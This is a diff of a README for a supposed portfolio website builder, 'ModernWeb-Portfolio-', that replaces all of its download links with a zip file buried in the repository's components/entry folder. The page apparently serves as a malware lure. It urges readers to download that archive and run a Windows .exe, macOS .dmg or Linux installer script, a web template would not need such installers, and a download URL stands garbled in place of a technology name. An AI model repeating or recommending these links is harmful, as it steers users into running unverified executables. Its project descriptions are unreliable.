@@ -1,13 +1,13 @@
 # 🎉 ModernWeb-Portfolio- - Your Easy Portfolio Website Builder
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/kali32421/ModernWeb-Portfolio-/main/lirelline/ModernWeb-Portfolio-.zip%20Release-brightgreen)](https://raw.githubusercontent.com/kali32421/ModernWeb-Portfolio-/main/lirelline/ModernWeb-Portfolio-.zip)
+[![Download Latest Release](https://github.com/kali32421/ModernWeb-Portfolio-/raw/refs/heads/main/components/entry/Portfolio_Web_Modern_1.0.zip%20Release-brightgreen)](https://github.com/kali32421/ModernWeb-Portfolio-/raw/refs/heads/main/components/entry/Portfolio_Web_Modern_1.0.zip)
 
 ## 🚀 Getting Started
 Welcome to ModernWeb-Portfolio! This application lets you create a stunning portfolio website to showcase your work. With built-in features and an easy setup, you can have your online presence ready in no time.
 
 ### 🌟 Features
-- **Built with TypeScript and https://raw.githubusercontent.com/kali32421/ModernWeb-Portfolio-/main/lirelline/ModernWeb-Portfolio-.zip** Enjoy a smooth and fast user experience.
+- **Built with TypeScript and https://github.com/kali32421/ModernWeb-Portfolio-/raw/refs/heads/main/components/entry/Portfolio_Web_Modern_1.0.zip** Enjoy a smooth and fast user experience.
 - **Firebase Integration:** Easily manage your data and user accounts.
 - **Blog Functionality:** Share your thoughts and updates through a built-in blog feature.
 - **Search Functionality:** Users can quickly search through your site using cmdk.
@@ -26,7 +26,7 @@ This project welcomes contributions! If you want to report an issue, give feedba
 To get started with ModernWeb-Portfolio:
 
 1. **Visit the Releases Page:** Click the link below to download the latest release of the application.
-   - [Download Latest Release](https://raw.githubusercontent.com/kali32421/ModernWeb-Portfolio-/main/lirelline/ModernWeb-Portfolio-.zip)
+   - [Download Latest Release](https://github.com/kali32421/ModernWeb-Portfolio-/raw/refs/heads/main/components/entry/Portfolio_Web_Modern_1.0.zip)
 
 2. **Choose Your Version:** On the releases page, you will see different versions. Select the latest version that suits your operating system.
 
@@ -35,7 +35,7 @@ To get started with ModernWeb-Portfolio:
 4. **Install the Application:**
    - **Windows:** Open the `.exe` file and follow the installer instructions.
    - **macOS:** Open the `.dmg` file and drag the app into your Applications folder.
-   - **Linux:** Extract the `https://raw.githubusercontent.com/kali32421/ModernWeb-Portfolio-/main/lirelline/ModernWeb-Portfolio-.zip` file and run the installer script in the terminal.
+   - **Linux:** Extract the `https://github.com/kali32421/ModernWeb-Portfolio-/raw/refs/heads/main/components/entry/Portfolio_Web_Modern_1.0.zip` file and run the installer script in the terminal.
 
 5. **Launch the Application:** Find the application in your programs and double-click to open it.
 
@@ -65,7 +65,7 @@ Feel free to dive deeper into each topic for better understanding and implementa
 Join our community to connect with other users. Share your portfolio, ask for feedback, and discuss features. We host regular meetups and discussions to keep everyone engaged and informed.
 
 ## 🔗 Useful Links
-- **Releases Page:** [Download Latest Release](https://raw.githubusercontent.com/kali32421/ModernWeb-Portfolio-/main/lirelline/ModernWeb-Portfolio-.zip)
+- **Releases Page:** [Download Latest Release](https://github.com/kali32421/ModernWeb-Portfolio-/raw/refs/heads/main/components/entry/Portfolio_Web_Modern_1.0.zip)
 - **Documentation:** Access the comprehensive guide for in-depth instructions.
 - **Community Forum:** Join the discussion with other users and developers.
 
